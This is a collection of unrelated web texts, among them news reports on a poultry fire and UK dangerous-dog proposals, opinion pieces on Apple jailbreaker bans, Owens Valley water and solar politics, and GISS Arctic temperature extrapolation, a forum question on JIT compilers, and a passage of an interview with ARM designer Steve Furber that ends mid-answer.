A fire and rescue spokesman said about 9,000 chickens died during the fire which started at 0530 GMT .
It is thought the fire could have started in an extractor fan .
Fire crews are carrying out investigations .
At least two of them sure seem to think so !
Jailbreak scenesters Sherif Hashim and iH8sn0w are both reporting bannings — by Apple ID , strangely — following their latest hacks .
Is Apple attacking jailbreak from the bottom up ?
Maybe .
Advertisement
Both Sherif Hashim and iH8sn0w were behind the discovery of recent iPhone exploits , and both are currently receiving a " This Apple ID has been banned for security purposes " notification whenever they try to log into the ( actual ) App Store to download an app .
But .
But !
While Sherif 's exploit was publicly documented , IH8sn0w 's was shared only with the Dev Team .
So : Is Apple somehow detecting certain exploits and banning automatically ?
Unlikely .
Are the keeping an ear to the ground and banning active jailbreak scene hackers ?
Possibly , but that would be petty , and it would n't really stop them from doing their work .
Is something incidental happening here ?
Probably .
The content of the error message is telling :
It 's the same dialog that pops up in OS X apps that use your Apple ID when said ID has been locked out due to a suspicious number of failed login attempts .
My guess , though it 's firmly a guess , is that some behavior or glitch associated with the hacks these people are attempting triggers some kind of heuristic response from Apple 's servers , not explicitly because a phone is hacked or owned by hackers , but because something 's just off .
Advertisement
Then again , this could go the other way , and signal a future in which jailbreakers — not just hackers — risk blacklisting their Apple IDs should they crack their phones .
That 'd be a terrible PR move on Apple 's part , but it could be one of the easiest ways to quell the massive rise of piracy outside the App store .
This would be kind of terrible !
But I would n't rule it out .

The city of Los Angeles recently announced plans to transform Owens Valley into one of the largest sources of solar power in America , outfitting the region with a massive energy farm that would span 80 square miles and generate up to 10 percent of California ’s total electricity output .
It truly is a monster , able to generate as much as 5 gigawatts of electricity , enough to power 1.5 million homes , dwarfing China ’s plans to build the world ’s biggest solar farm by a factor of three .
The scale of this energy farm would make a solar panel manufacturer drool : while its total cost has not been disclosed , a test section 1/600th of the project ’s final size is expected to cost $ 50 million .
The hefty price tag is why L.A. ’s Department of Water and Power ( DWP ) , the city ’s giant utility that will build and operate the solar farm , is eager to get cranking , afraid of missing its opportunity to tap into the lucrative government subsidies being handed out for solar and other green energy projects before they disappear .
On February 2 , DWP general manager David Freeman , who looks a bit like Noah Cross , the incestuous old pervert in Chinatown , made the 250 - mile trip to the Owens Valley to sell the locals on the plan , pitching it as a sure way to create jobs in the depressed rural region , increase local tax revenues and save their environment .
“ It ’s a triple hitter , ” he said , trying to convince Owens Valley residents why they should n’t object to a solar farm being built in their community .
“ I want this project to benefit the people up here in every way we can think of . ”
In reality , the project would benefit L.A. more than anyone else .
DWP does not plan on transmitting the electricity it produces to Los Angeles directly , nor does it plan to share some of it with Owens Valley .
Instead , the agency plans to do something much more lucrative : sell the power on the open market to utility giants like Edison Co. and Pacific Gas & Electric and send a big chunk of the profits to Los Angeles .
In 2009 alone , it contributed nearly $ 200 million to Los Angeles ’ general fund .
DWP is a money - maker for L.A. , and the city wants to expand the utility ’s business horizons .
But there is another side to the story that Freeman and the other Los Angeles bosses wo n’t tell you :
The project is as much about making money off green energy as it is about old - school plunder , about how one mighty municipality hijacked water from one of the most beautiful regions in California to make L.A. ’s early - 20th century real estate tycoons even richer .
It ’s a plunder that keeps on giving .
The groundwork for L.A. ’s looting happened almost a century ago .
At the time , the city ’s population was exploding , doubling every couple of years , feeding a real estate market that was entering hyper - bubble territory .
The city ’s land - owning tycoons — likeLos Angeles Times owners Gray Otis and Harry Chandler — needed all the water they could get to feed this bubble .
That ’s when they set their sights on Owens Valley , located in the Sierra Nevadas 250 miles away from Los Angeles .
The 14,000 - foot mountains that surround the valley collect rain and snow , feeding it into the Owens River and Owens Lake .
If tapped with an aqueduct , the valley could supply more than one million people and require no pumping .
Because the valley sat 4,000 feet above sea level , water would simply flow downhill .
The city sent thugs and operatives to the Owens Valley to secretly buy up land and mount a hostile takeover of its water , bribing , scamming and roughing up anyone who tried to resist .
In 1913 , the water started to flow .
With no pesky liberal environmentalists around ( and just a few pissed - off Owens Valley farmers armed with guns and dynamite ) , L.A. managed to transform the valley into an arid wasteland , draining Owens Lake in the space of a decade and making the region inhospitable to agriculture .
It became the most infamous water grab in American history , and the inspiration for Roman Polanski ’s Chinatown .
By the 1920s , desperate farmers started turning to terrorism to defend their livelihoods , dynamiting the aqueduct a few dozen times and sporadically staging armed assaults .
Los Angeles put down the insurrection by sending its own armed LAPD posse to protect the aqueduct and keep the peace , writes PBS :
Resistance flared up again in 1927 , when four masked men captured guards and blew up a 45 - foot section of the aqueduct .
[ William ] Mulholland [ who ran DWP ] sent out horseback patrols armed with machine guns , and issued shoot - to - kill orders when the aqueduct was bombed again .
But by the next year the war was over .
The Owens Valley Bank collapsed , wiping out the leaders of the opposition ….
Los Angeles has kept Owens Valley in a totalitarian lockdown ever since , running it like a banana republic that produces one valuable crop : water .
Today , Los Angeles gets about 30 percent of its entire water supply from the Owens Valley , and the city protects it aggressively , doing everything to maximize exports and minimize internal consumption .
As the valley ’s largest private landholder , L.A. has waged a war of stagnation on the valley ’s small towns by restricting access to real estate , leveling some properties and letting others stand vacant .
As recently as 2004 , Los Angeles cynically tried to convince the locals to codify this low - level warfare by barring any new development in the valley to “ preserve ” its decrepit ambiance .
Here ’s how the Los Angeles Times described the scene :
In Independence , a town of 500 , the sole grocery store recently closed because its customer base had dwindled .
About 15 miles south in downtown Lone Pine , the DWP last summer demolished several buildings it owned on a single block , leaving behind three gravel - covered lots locals have dubbed “ the missing teeth of Main Street . ”
You can see the locals ’ frustration and anger in the comments sections of news sites , like this comment on a Los Angeles article about the solar project :
L.A. owns sections of our neighborhoods , leaving rundown empty homes in towns that are in need of additional housing .
We build small homes in backyards , and crowd small trailer parks into our towns to make up for the lack of room . …
In the City of Bishop , we have a large empty lot in the middle of town , jokingly referred to as “ people ’s park . ”
We do n’t [ want ] LA owned open space in the middle of town , we need homes .
While its towns stagnated , parts of the Owens Valley were turned into one of the most polluted places in America .
A century of water diversions had turned Owens Lake into a toxic salt flat where fierce winds whipped up toxic dust and heavy metal - laden dusts and spread it across the valley .
“ [ T ] he 100 - square - mile lake bed became one of the largest sources of hazardous dust in the nation , ” according to the L.A. Times .
That was Owens Valley ’s problem , as far as L.A. was concerned .
So the stripping and pollution continued largely unnoticed until it became suddenly unprofitable — the toxic dust did n’t bother L.A. until it started cutting into its water export racket .
In 2001 , to comply with federal clean air laws , L.A. was forced to shallow - flood 40 square miles of Owens Lake .
That meant leaving enough water for a city of 600,000 , or 20 percent of its total Owens Valley exports and a market value of roughly $ 10 million .
It was a small victory for the local population .
Stronger federal environmental regulations finally put the law on their side and succeeded in forcing their overlord to leave some of its looted water behind .
And that ’s where the solar project comes in : L.A. hopes to use the 80 - square - mile solar array to slow down and break up the killer storms the city is responsible for creating .
Because , as far as Los Angeles is concerned , dumping water back into Owens Lake is just as good as wasting it .
Although DWP would have to use large amounts of water to keep its solar panels clean and free of dirt , the project would save much more than it would consume .
If built to its full monstrous capacity — 5 gigawatts — DWP ’s Owens Valley solar project would use 83 million gallons of water every year , a fraction of the 10 billion gallons L.A. is forced to leave behind just for dust mitigation .
( Industry standards say that one megawatt of solar power requires 16,689 gallons of water . )
“ We will save water by not having to use so much of it to control dust , we will cut down on the wind that creates the dust storms with the solar panels , and we will generate renewable energy at the same time , ” the DWP ’s David Freeman told a packed church auditorium in the Owens Valley .
“ I do n’t know of any time in our 80 - year history here that there has been so much common interest . ”
The locals know L.A. ’s green posturing is just for show , and that the city is still the same predatory beast .
The solar panel deal would be great for Los Angeles , allowing it to resume looting water at maximum levels and make money selling electricity .
But it seems like the people of Owens Valley get nothing but a whole new layer of exploitation rubbed in their faces : not only will their Los Angeles overlords continue their plunder , now they ’ll have a whole new revenue stream .
L.A. ’s utility chief Freeman recently told a reporter that the DWP owned the people of Owens Valley “ lock , stock and barrel . ”
He was right .

All dogs could be insured under dangerous breeds plans
Please turn on JavaScript .
Media requires JavaScript to play .
All dog owners in England and Wales would have to insure against their pet attacking someone under Labour proposals to tackle dangerous breeds .
Police and local authorities could also be given powers to force owners of dangerous dogs to muzzle them or even get them neutered .
Ministers say the consultation responds to concerns about the use of animals to intimidate or threaten people .
But insurers said Labour 's plan could prove " more difficult than it looks " .
More than 100 people a week are admitted to hospital after dog attacks .
There has also been a reported rise in levels of dog fighting and illegal ownership , particularly by gangs who are using dangerous dogs as status symbols .
Complicated Coming a few weeks before a general election is expected , the government has launched a consultation on amending the 1991 Dangerous Dogs Act .
This legislation banned ownership of four types : the pit bull terrier , the Japanese tosa , the dogo Argentino and the fila Brasileiro .
It also gave police powers to deal with any dogs , of whatever breed , that became out of control in a public place - with destruction of the animal the ultimate sanction .
Thousands of our members are attacked at work every year .
This reform cannot come soon enough
Billy Hayes
General secretary , CWU
Should all dogs be insured ?
In pictures : dangerous dogs
But if a dog not on the banned list of types causes an injury on private property - such as someone 's home - it is not covered by the Dangerous Dogs Act .
Instead , owners have to be pursued under the Dogs Act of 1871 , which is seen as more time - consuming and complicated .
The government 's consultation suggests extending the 1991 legislation to private property .
Ministers argue this will also protect postal workers , telecoms engineers and other people whose work takes them on to private land .
Another proposal is to introduce compulsory third - party insurance for dog owners to ensure attack victims are compensated .
' Public safety '
Home Secretary Alan Johnson said he was concerned that some owners were keeping dogs with the sole purpose of intimidating other people .
He told BBC News : " What most dog owners recognise is that what 's going on is cruelty to animals .
" Other dogs are being treated abysmally because of this fashion for ' status dogs ' , which has been the main issue over the last five or six years . "

More from Today programme But Nick Starling , of the Association of British Insurers , said : " While we understand the desire to reduce the number of attacks by dogs , making insurance compulsory for all dog owners is much more difficult than it looks .
" There is currently no stand - alone third - party insurance cover for the owners of dangerous dogs , and no desire by insurers to provide cover against this very high risk .
" Making it compulsory for pet owners would still not make it compulsory for insurers to offer the cover .
" While pet insurance policies will usually include third - party liability cover for dog owners , this would not cover dangerous dogs as defined under The Dangerous Dogs Act , and other specified breeds . "
He added : " Even if third - party insurance was available , how would such a system be enforced , especially as many of the owners of dangerous dogs would be unlikely to take out insurance , even if it was compulsory .
" And would someone who was attacked by an uninsured dog be entitled to compensation , and if so from whom ? "

The Conservatives said the government had allowed the problem to get worse , with the number of people convicted for allowing their dogs to cause injury more than doubling in the past decade .
Liberal Democrat home affairs spokesman Chris Huhne said penalties for dangerous dog offences had to be " sensible " and that any changes to the law had to be " simple and strong " .
The proposed insurance plan would not apply in Scotland .
However , a backbench bill proposed by the SNP's Christine Grahame is currently being examined by the Scottish Parliament .
The Control of Dogs Bill would allow councils to impose restrictions on owners who failed to control their pets .

Guest post by Willis Eschenbach
Inspired by this thread on the lack of data in the Arctic Ocean , I looked into how GISS creates data when there is no data .
GISS is the Goddard Institute for Space Studies , a part of NASA .
The Director of GISS is Dr. James Hansen .
Dr. Hansen is an impartial scientist who thinks people who do n’t believe in his apocalyptic visions of the future should be put on trial for “ high crimes against humanity ” .
GISS produces a surface temperature record called GISTEMP .
Here is their record of the temperature anomaly for Dec - Jan - Feb 2010 :
Figure 1 . GISS temperature anomalies DJF 2010 .
Grey areas are where there is no temperature data .
Now , what ’s wrong with this picture ?
The oddity about the picture is that we are given temperature data where none exists .
We have very little temperature data for the Arctic Ocean , for example .
Yet the GISS map shows radical heating in the Arctic Ocean .
How do they do that ?
The procedure is one that is laid out in a 1987 paper by Hansen and Lebedeff
In that paper , they note that annual temperature changes are well correlated over a large distance , out to 1200 kilometres ( ~750 miles ) .
( “ Correlation ” is a mathematical measure of the similarity of two datasets .
It ’s value ranges from zero , meaning not similar at all , to plus or minus one , indicating totally similar .
A negative value means they are similar , but when one goes up the other goes down . )
Based on Hansen and Lebedeff ’s finding of a good correlation ( +0.5 or greater ) out to 1200 km from a given temperature station , GISS show us the presumed temperature trends within 1200 km of the coastline stations and 1200 km of the island stations .
Areas outside of this are shown in gray .
This 1200 km. radius allows them to show the “ temperature trend ” of the entire Arctic Ocean , as shown in Figure 1 .
This gets around the problem of the very poor coverage in the Arctic Ocean .
Here is a small part of the problem , the coverage of the section of the Arctic Ocean north of 80° North :
Figure 2 . Temperature stations around 80° north .
Circles around the stations are 250 km ( ~ 150 miles ) in diameter .
Note that the circle at 80 °N is about 1200 km in radius , the size out to which Hansen says we can extrapolate temperature trends .
Can we really assume that a single station could be representative of such a large area ?
Look at Fig.1 , despite the lack of data , trends are given for all of the Arctic Ocean .
Here is a bigger view , showing the entire Arctic Ocean .
Figure 3 . Temperature stations around the Arctic Ocean .
Circles around the stations are 250 km ( ~ 150 miles ) in diameter .
Note that the area north of 80 °N ( yellow circle ) is about three times the land area of the state of Alaska .
What Drs. Hansen and Lebedeff did n’t notice in 1987 , and no one seems to have noticed since then , is that there is a big problem with their finding about the correlation of widely separated stations .
This is shown by the following graph :
Figure 4 . Five pseudo temperature records .
Note the differences in the shapes of the records , and the differences in the trends of the records .
Curiously , these pseudo temperature records , despite their obvious differences , are all very similar in one way — correlation .
The correlation between each pseudo temperature record and every other pseudo temperature records is above 90 % .
Figure 5 . Correlation between the pseudo temperature datasets shown in Fig. 3
The inescapable conclusion from this is that high correlations between datasets do not mean that their trends are similar .
OK , I can hear you thinking , “ Yea , right , for some imaginary short 20 year pseudo temperature datasets you can find some wild data that will have different trends .
But what about real 50 - year long temperature datasets like Hansen and Lebedeff used ? ”
Glad you asked … here are nineteen fifty - year long temperature datasets from Alaska .
All of them have a correlation with Anchorage greater than 0.5 ( max 0.94 , min 0.51 , avg 0.75 ) .
All are within about 500 miles of Anchorage .
Figure 6 shows their trends :
Figure 6 . Temperature trends of Alaskan stations .
Photo is of Pioneer Park , Fairbanks .
As you can see , the trends range from about one degree in fifty years to nearly three degrees in fifty years .
Despite this huge ~ 300 % range in trends , all of them have a good correlation ( greater than +0.5 ) with Anchorage .
This clearly shows that good correlation between temperature datasets means nothing about their corresponding trends .
Finally , as far as I know , this extrapolation procedure is unique to James Hansen and GISTEMP .
It is not used by the other creators of global or regional datasets , such as CRU , NCDC , or USHCN .
As Kevin Trenberth stated in the CRU emails regarding the discrepancy between GISTEMP and the other datasets ( emphasis mine ) :
My understanding is that the biggest source of this discrepancy [ between global temperature datasets ] is the way the Arctic is analyzed .
We know that the sea ice was at record low values , 22 % lower than the previous low in 2005 .
Some sea temperatures and air temperatures were as much as 7C above normal .
But most places there is no conventional data .
In NASA [ GISTEMP ] they extrapolate and build in the high temperatures in the Arctic .
In the other records they do not .
They use only the data available and the rest is missing .
No data available ?
No problem , just build in some high temperatures …
Conclusion ?
Hansen and Lebedeff were correct that the annual temperature datasets of widely separated temperature stations tend to be well correlated .
However , they were incorrect in thinking that this applies to the trends of the well correlated temperature datasets .
Their trends may not be similar at all .
As a result , extrapolating trends out to 1200 km from a given temperature station is an invalid procedure which does not have any mathematical foundation .
[ Update 1 ] Fred N. pointed out below that GISS shows a polar view of the same data .
Note the claimed coverage of the entirety of the Arctic Ocean .
Thanks .
[ Update 2 ] JAE pointed out below that Figure 1 did not show trends , but anomalies .
boballab pointed me to the map of the actual trends .
My thanks to both .

I 've been watching the interpreter and JIT compiler competitions a bit in the JavaScript and Lua worlds .
I have n't collected much organized data but the impression I 'm getting is that tracing JIT's are turning up as the winners : sometimes even beating programs statically compiled with GCC .
Is there a growing body of evidence that tracing JIT compilers are the horse to bet on ?
Will a more static style JIT like Google 's V8 be able to keep up ?
Thanks ,

A Conversation with Steve Furber
The designer of the ARM chip shares lessons on energy - efficient computing .
If you were looking for lessons on energy - efficient computing , one person you would want to speak with would be Steve Furber , principal designer of the highly successful ARM ( Acorn RISC Machine ) processor .
Currently running in billions of cellphones around the world , the ARM is a prime example of a chip that is simple , low power , and low cost .
Furber led development of the ARM in the 1980s while at Acorn , the British PC company also known for the BBC Microcomputer , which Furber played a major role in developing .
In our interview this month he shares some of the lessons on energy - efficient computing he has learned through working on these and subsequent projects .
He also fills us in on the innovative work he is doing at Manchester University , where he is a professor of computer engineering in the School of Computer Science .
Furber 's SpiNNaker ( Spiking Neural Network Architecture ) project is a massively parallel system designed to simulate the workings of part of the human brain .
Composed of a million ARM processors , SpiNNaker could help unravel some of the mysteries of the brain and eventually could provide valuable lessons on energy - efficient , fault - tolerant computation .
Interviewing Furber is Queue editorial board member David Brown , who met Furber at Cambridge University , where they both received Ph. Ds.
Brown , an engineer in Sun 's Solaris Engineering Group , has also thought a lot about energy - efficient computing .
He works on the Solaris operating system 's core power - management facilities , with a particular focus on Sun 's x64 hardware platforms .
Brown 's resume prior to coming to Sun includes stints at Silicon Graphics , which he cofounded , and DEC , where he helped build the team that developed the graphics architecture for DEC 's MIPS workstations .
David Brown
Can you tell us a little about your background and the early history of Acorn leading up to the BBC Microcomputer ?
Steve Furber I was born and brought up in Manchester , U.K. , and went to university in Cambridge .
My first degree was in maths , and then I did a postgraduate year in maths before going into the engineering department to do a Ph.D in aerodynamics .
In the course of my Ph.D work and the research fellowship in aerodynamics that followed , I got increasingly involved in using computers to get results from my aerodynamics experiments .
I got interested in how computers work , and I joined the Cambridge University Processor Group when it formed around 1977 - 78 .
This was a student society for those of us who liked building computers for fun .
I built a machine using a Signetics 2650 microprocessor , an 8 - bit micro that we had to order from California , which in those days was a bit exciting .
I bought this and some other parts and wired a small machine together .
At that time , Hermann Hauser and Chris Curry were looking to form a company , which became Acorn Computers .
They naturally went to the Cambridge University Processor Group to look for people with the technical knowledge to do some of the work , and I slowly got drawn into the embryonic Acorn .
In the final year of my fellowship , I was doing odd bits with Acorn and using machines built with Acorn parts in my aerodynamics research .
Acorn got wind of the fact that the BBC was looking to use a particular microcomputer system to go with a TV program it was planning for early 1982 .
Around Easter 1981 , Acorn persuaded the BBC to look at what it would offer , and then in a mad week , we built a prototype of what became the BBC Micro .
We got it to work at 7 a.m. on the Friday morning before the BBC arrived at 10 a.m. , and Acorn got the BBC Microcomputer contract .
At the end of my research fellowship , I decided to join Acorn 's full - time staff .
The BBC Micro was a 6502 - powered 8 - bit system .
It had lots of expandability , so you could add a second processor onto it .
You could add a receiver that would pick up software that the BBC broadcast through its Ceefax [ the BBC 's teletext information service ] transmissions , and it was used extensively in schools .
It was a big success in the U.K. and a few other markets , but not so visible in the U.S. market .
Although Acorn did attempt to set up a U.S. sales operation , it was not terribly successful because we were competing with Apple on Apple 's home ground , and that 's always a fairly risky thing to do .
DB
This represented the debut of personal computing in the U.K. in the same way that the Apple II might have done in this country — in fact , on a very parallel technology base : the 6502 processor .
I think these are two social microcosms that did n't see one another all that well because of the respective companies and closures involved .
SF
We were aware of the Apple II .
The BBC Micro used the same processor , but it was built a little bit later so we pushed it a bit faster .
We were running the 6502 at 2 megahertz , whereas the Apple II was running a 1 - megahertz 6502 .
The BBC Micro went on to be very successful , and that was a really exciting time to be building small microcomputers .
In the U.S. companies such as Apple were flourishing .
I remember our early discussions with the BBC , and they were convinced that on the back of this program we would be able to sell 12,000 BBC Micros , which was a big enough number to be exciting .
Of course , it turned out to be wrong by two orders of magnitude .
We sold 1.5 million BBC Micros before the enthusiasm began to wane .
That was a remarkable period — sufficiently remarkable that the BBC recently made a comedy - drama about that period and the competition between Acorn and another U.K. company , Sinclair , for the BBC contract and the sales that resulted in that very early boom .
DB How did the initial excitement with the BBC Micro lead to the ARM ?
SF Looking back , this was in a very compressed period of time : the BBC Micro first went on sale in January 1982 , the design of the first ARM microprocessor started in late ' 83 , and we had the first working ARM silicon in April 1985 .
With the BBC Micro being so successful , it was clear that Acorn needed to continue product development to build on that success , and a whole strange set of things came together that resulted in the ARM .
We had been playing in the lab with various 16 - bit microprocessors , and we found that they did n't really quite cut it for us for two reasons .
First , they both were based on pretty complex instruction sets , and this meant that they had very poor realtime interrupt response .
The BBC Micro had no hardware support in the form of DMA ( direct memory access ) controllers , and all the realtime I/O was handled by software using interrupts .
What we found was that the 16 - bit micros in the early 1980s had worse interrupt response time than the 6502 .
Second , we had developed this model of performance where the principal determinant of any computer 's performance was how much accessible memory bandwidth the processor could use .
In the early 1980s , cache memories were not commonplace , so the available memory bandwidth was determined by the performance of commodity DRAM .
The 16 - bit microprocessors of the early 1980s could n't use all the bandwidth that even DRAM could provide , and that struck us as the wrong answer .
The memory bandwidth was the primary resource , and it was the processor 's job to make the maximum possible use of that .
We were sitting there thinking about these two issues and were not sure which way to go when we got wind of the RISC papers published by Berkeley and Stanford in the early 1980s .
Their story — building a simple processor that very well matched the memory and had very simple instructions so it had good interrupt response time — resonated very strongly .
We began to think in terms of whether we might design our own processor along the Berkeley and Stanford RISC lines .
Another factor in this , which is completely unrelated to the technical story , is that Andy Hopper , who is now head of the Cambridge computer lab , was a director of Acorn and persuaded Hermann [ Hauser ] , who led the technical work , that it was really important to get into silicon design .
I remember him saying around that time that in the future there would be two sorts of computer companies : those that have learned to make chips and those that have gone out of business .
With Hopper 's advice , Acorn chose VLSI Technology as its supplier of chip design tools .
We recruited a small but experienced chip design team and bought the Apollo workstation , so we had the machines , the software , and the people — but they did n't have any chips to design .
Wilson and I were doodling processor designs on bits of paper , and since these chip design guys had nothing to do , we were authorized to occupy them with sketching out some processor designs .
We figured this project was not likely to succeed , but we thought , " We 'll set off designing this microprocessor , we 'll learn lots , and we 'll find out why it 's not a good idea before we 've actually made the silicon . "
With what we learned in the process , we figured we would be better positioned to decide which is the right chip to buy for our next product .
At that stage microprocessor design was a black art for people like us .
It had a mystique , and we did n't really think it was something small companies could do .
But we just set about doing this design work anyway , and it turned out it was n't a black art ; the microprocessor is just a piece of logic , like other bits of logic we had designed .
The chip guys could put it all together , and , in fact , in 18 months we had a piece of working silicon .
Although it needed work , it was highly competitive while being much simpler than the commercial offerings .
At that point , the company said , " Well , OK , we 've got a good microprocessor here .
Let 's configure our product plans around this . "
That really is how the ARM emerged : a set of ideas coming together , thoughts coming together , resources coming together , and I guess quite a lot of luck in that we got first - time working silicon .
And it worked well .
DB A couple of interesting ideas occur to me .
One is the emphasis on design simplicity that RISC had as part of its principles , but that also was a constraint on you guys .
The other is the lack of hubris about this that you might have had if you 'd had more resources and a bigger company .
SF
That 's absolutely true .
I know Hermann has said a few times that he thinks the Acorn team had two advantages that the big semiconductor teams did n't have : first , we had no money so everything had to be done very cheaply ; and second , we had no people .
This is good management retrospective : by depriving us of resources of any sort , they forced us to make decisions in favor of simplicity .
The RISC idea was a good starting point , but the Berkeley - Stanford designs were academic and not intended for commercial use .
The ARM is not quite as pure as the Berkeley RISC designs .
It 's got slightly denser instruction encoding and slightly richer instructions in the instruction set .
Basically , whenever we were looking at a decision , it was clear that we had to decide in favor of simplicity or we would never get the design finished and we would never get it made — and if we did , it would never work .
DB
One of the things that came out of that was that the ARM turned out to be a very low - power chip .
There 's an interesting story in how that came to be that perhaps you would like to tell .
SF
The ARM was conceived as a processor for a tethered desktop computer , where ultimate low power was not a requirement .
We wanted to keep it low cost , however , and at that time , keeping the chip low cost meant ensuring it would go in low - cost packaging , which meant plastic .
In order to use plastic packaging , we had to keep the power dissipation below a watt — that was a hard limit .
Anything above a watt would make the plastic packaging unsuitable , and the package would cost more than the chip itself .
We did n't have particularly good or dependable power - analysis tools in those days ; they were all a bit approximate .
We applied Victorian engineering margins , and in designing to ensure it came out under a watt , we missed , and it came out under a tenth of a watt — really low power .
Of course , all the previous arguments about keeping it very simple also push in this direction .
The first ARM chip had only about 25,000 transistors .
It was a tenth the complexity by transistor count of some of the processors at the time .
DB
So some of it was just the scale of the chip and the simplicity of the design , since you did n't have too much circuitry on there .
Were there any circuit - level considerations as well ?
SF
No , there was nothing particularly clever done at the circuit level to keep the power under control .
It was a CMOS ( complementary metal - oxide semiconductor ) chip , and these were fairly early days for high - speed CMOS .
The processor that was used in the BBC Micro — the 6502 — was an NMOS ( negative - channel metal - oxide semiconductor ) processor .
For the ARM , we went to CMOS , but that was a fairly simple decision at the time .
We pushed the technology for design convenience rather than for low power , so we opted for a two - level metal process , even though at the time two - level metal was still considered fairly risky .
Using two - level metal made it much easier to modularize the design to get bits designed separately and then wired together at the top level , but I do n't recall doing anything at the circuit level to control the power .
DB
There was a subsequent evolution where as a result of its power efficiency , the ARM was adopted in spaces where that was very important — in particular , the cellphone business .
I was also thinking about what happened with the StrongARM at DEC ( Digital Equipment Corporation ) , where perhaps more attention was given to some of the circuit - level design techniques that had great consequence for higher - end computers .
SF During the 1980s the ARM was predominantly used in Acorn 's products .
The big change happened when the ARM was spun out of Acorn as a joint venture with Apple and VLSI Technology in 1990 .
The processor was still going in Acorn 's desktop products , but it was also being tuned for the Apple Newton , a portable hand - held device , where power was all important .
At that point , the company really started looking at the issues of low - power design .
StrongARM came out in the mid-'90s .
It was absolutely leading in terms of power performance at that stage , and that was achieved principally through low - voltage operation , using process technology that suited low - voltage operation , and using circuit - level design optimization that would maintain the speed despite the low voltage .
DB Dan Dobberpuhl was one of the principals at DEC who was involved in that sort of work [ see Queue 's interview with Dobberpuhl ] .
What 's interesting is this same management of the thermal envelope , which you described for the plastic package at Acorn in the very early days , turned out to be a driver for the high - end computer systems at Digital as well , when it was building these things based on 100K ECL ( emitter - coupled logic ) technology .
Digital was focused on power to manage the thermal considerations , but then found out it could get quite a lot of performance out of much lower - power designs .
I think you touched on the salient observation there : at much lower voltage and frequency you could have vastly lower power but still get a great deal more performance per unit of power .
That became sort of the driving design consideration even for these very high - end systems .
SF StrongARM was quite a remarkable processor when it first came out , because compared with every ARM that had gone before , it achieved a much higher clock rate but still delivered within the one - watt envelope .
I think Digital had the Newton and Newton - like product market in mind for it , and low voltage was the key .
DB Was the target for StrongARM still portable or mobile devices ?
SF Yes .
Acorn used it in its desktop machines , but that was n't the target .
What was remarkable was that you had a 200 - megahertz processor still running within an envelope of about a watt and in low - cost packaging that would n't require a heat sink of any sort .
The Digital work was remarkable , and its derivation of the power target from the Alpha was quite illuminating .
Digital basically said if you start with an Alpha at whatever it was — 20 watts — and go from a 64 - bit to a 32 - bit data path , that 's a factor of two , and then you do this other thing , that 's another factor of two .
The arithmetic to get from Alpha to StrongARM was pretty straightforward .
DB
We 've focused a lot on the hardware , and I think that 's a very important context in the framework of what 's going on with energy and computing .
Looking forward , is most of this pursuit to be energy efficient going to be achieved by advances in the component and hardware technology , or is it also going to have great consequence for software developers ?
SF
If you want an ultimate low - power system , then you have to worry about energy usage at every level in the system design , and you have to get it right from top to bottom , because any level at which you get it wrong is going to lose you perhaps an order of magnitude in terms of power efficiency .
The hardware technology has a first - order impact on the power efficiency of the system , but you 've also got to have software at the top that avoids waste wherever it can .
You need to avoid , for instance , anything that resembles a polling loop because that 's just burning power to do nothing .
I think one of the hard questions is whether you can pass the responsibility for the software efficiency right back to the programmer .
Do programmers really have any understanding of how much energy their algorithms consume ?
I work in a computer science department , and it's not clear to me that we teach the students much about how long their algorithms take to execute , let alone how much energy they consume in the course of executing and how you go about optimizing an algorithm for its energy consumption .
Some of the responsibility for that will probably get pushed down into compilers , but I still think that fundamentally , at the top level , programmers will not be able to afford to be ignorant about the energy cost of the programs they write .
What you need in order to be able to work in this way at all is instrumentation that tells you that running this algorithm has this kind of energy cost and running that algorithm has that kind of energy cost .
You need tools that give you feedback and tell you how good your decisions are .
Currently the tools do n't give you that kind of feedback .
DB Yes , right now we have very little instrumentation or observability of what the costs are , so you can't even empirically search around by trying different techniques to seek a relative optimum .
It 's not even open loop ; it 's just blind at the moment .
SF
You can't even see the shape of the surface that you 're trying to optimize .
But I think folks who work in consumer electronics , where energy has been an issue for a decade or more , are getting pretty good at doing this top - to - bottom optimization .
It 's not perfect , but you can walk around with your iPhone , which will automatically find networks if they 're there and not waste too much power looking for them if they 're not .
In other areas where there are concerns about energy usage — for example , data centers — the energy issue is just beginning to become a focus .
From what I 've seen , data - center computing could achieve some very big wins without doing anything deeply original or technical .
Techniques such as just moving the power supply outside the air - conditioned space have a first - order effect on the power consumption of the data center .
DB I want to touch on the tension between the kinds of things that have been done for energy efficiency in the mobile space versus the more general - purpose computing space .
The mobile space has a much better - defined problem , which gives you enough constraints or well - known repeatable patterns that you may be able to optimize , whereas in much more general - purpose computing , you have this terrible difficulty of trying to be all things to all people , where you do n't necessarily know what application is going to be run on the system and how it 's going to behave .
SF
That 's right , and we know that making a single thread go as fast as possible involves complex management of pipelines and such , and that 's very expensive in energy terms .
One of the interesting issues at the moment as we 're going to multicore computing at all levels is whether you want your system to have 10 or 100 complex , high - performance cores , or whether you can manage with 100 or 1,000 much simpler cores .
If you can cope with parallelizing the problem so that you can run a larger number of threads on a larger number of simple cores , then you can get a real energy win .
DB Intel is building multicore chips , sometimes called heterogeneous multicore , which have some cores with complex CPU microarchitecture and a larger number with simpler CPU microarchitecture .
Then there 's the challenge of trying to identify those applications that can benefit from the more complex cores to get greater performance at the cost of more energy , and those that can't really get those benefits , and then to target those applications to the simpler cores and not waste energy .
Unfortunately , we 're not yet at the point where either the hardware or the system software is easily able to detect where the best fit is .
SF
The introduction of multicore a few years ago demands a disruptive change in how software is built , and until that time comes , then all this optimization is extremely difficult .
I guess you can do it extrinsically with system analysis techniques , but if you want to remain flexible , you 've got to do it internally to the system using something more like the dynamic optimization techniques that are used in just - in - time compilation .
DB
There 's also the question of how much stuff is going to be happening in the components themselves to adjust performance for energy somewhat automatically : for example , the dynamic voltage and frequency scaling sorts of things where they say , " Well , based on how heavily utilized the hardware is , we 'll adjust the performance level somewhat automatically . "
These things can be done fairly successfully almost autonomically in the hardware component , and that 's because the changes can be made very quickly with very little energy cost .
SF
The technology is going to push us farther down that path because as we continue shrinking transistors , the variability and reliability of the components are going to become serious problems .
DVS ( dynamic voltage scaling ) is one of the few weapons we have to cope with this problem .
Near - future chips are going to have to have dynamic voltage adjustments at at least the submodule level right across the chip , so that a component that has a long critical path because of a weak transistor in that path can be brought back into line by cranking its voltage up a bit .
Also , error management is going to require these sorts of techniques .
Very similar to DVS is the Razor technique , which ARM has been developing .
This allows the processor to run toward the corner of the voltage and frequency envelope until some level of errors starts to occur .
